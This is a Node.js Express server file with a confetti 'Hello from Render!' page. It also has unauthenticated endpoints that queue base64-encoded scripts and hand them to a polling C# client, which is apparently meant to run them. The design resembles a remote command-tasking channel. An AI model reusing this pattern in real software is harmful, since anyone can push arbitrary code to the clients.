// server.js
const express = require("express");
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON body
app.use(bodyParser.json());

// Simple HTML page for root (kept your original HTML)
const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>Hello from Render!</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <script>
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
          disableForReducedMotion: true
        });
      }, 500);
    </script>
    <style>
      @import url("https://p.typekit.net/p.css?s=1&k=vnd5zic&ht=tk&f=39475.39476.39477.39478.39479.39480.39481.39482&a=18673890&app=typekit&e=css");
      @font-face {
        font-family: "neo-sans";
        src: url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff2"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("woff"), url("https://use.typekit.net/af/00ac0a/00000000000000003b9b2033/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3") format("opentype");
        font-style: normal;
        font-weight: 700;
      }
      html {
        font-family: neo-sans;
        font-weight: 700;
        font-size: calc(62rem / 16);
      }
      body {
        background: white;
      }
      section {
        border-radius: 1em;
        padding: 1em;
        position: absolute;
        top: 50%;
        left: 50%;
        margin-right: -50%;
        transform: translate(-50%, -50%);
      }
    </style>
  </head>
  <body>
    <section>
      Hello from Render!
    </section>
  </body>
</html>
`;

app.get("/", (req, res) => res.type('html').send(html));

// in-memory buffer and timestamp of last read
let scriptBuffer = []; // buffered scripts
let lastBufferRead = null; // ISO string or null

// POST /scriptRequest
// Expected JSON body: { script: "BASE64_STRING" }
app.post('/scriptRequest', (req, res) => {
  const { script } = req.body;

  if (!script || typeof script !== 'string') {
    return res.status(400).json({ error: 'Missing or invalid "script" field' });
  }

  scriptBuffer.push(script);
  res.json({ status: 'ok', message: 'Script added to buffer' });
});

// GET /scriptBuffer  (original case)
app.get('/scriptBuffer', (req, res) => {
  const scriptsToSend = [...scriptBuffer]; // copy current list
  scriptBuffer = []; // reset buffer
  lastBufferRead = new Date().toISOString();
  res.json({ scripts: scriptsToSend, lastBufferRead });
});

// Also provide lowercase alias /scriptbuffer (in case your C# calls lowercase)
app.get('/scriptbuffer', (req, res) => {
  const scriptsToSend = [...scriptBuffer]; // copy current list
  scriptBuffer = []; // reset buffer
  lastBufferRead = new Date().toISOString();
  res.json({ scripts: scriptsToSend, lastBufferRead });
});

// GET /bufferCalled
// Returns when /scriptBuffer (or alias) was last read.
// Example response when called previously:
// { lastBufferRead: "2025-08-20T10:21:34.123Z", epochMs: 1724115694123 }
app.get('/bufferCalled', (req, res) => {
  if (!lastBufferRead) {
    return res.json({ lastBufferRead: null, message: "Buffer has not been read yet" });
  }

  const epochMs = Date.parse(lastBufferRead);
  res.json({ lastBufferRead, epochMs });
});

// start server once
const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// optional: bump timeouts if needed
server.keepAliveTimeout = 120 * 1000;
server.headersTimeout = 120 * 1000;
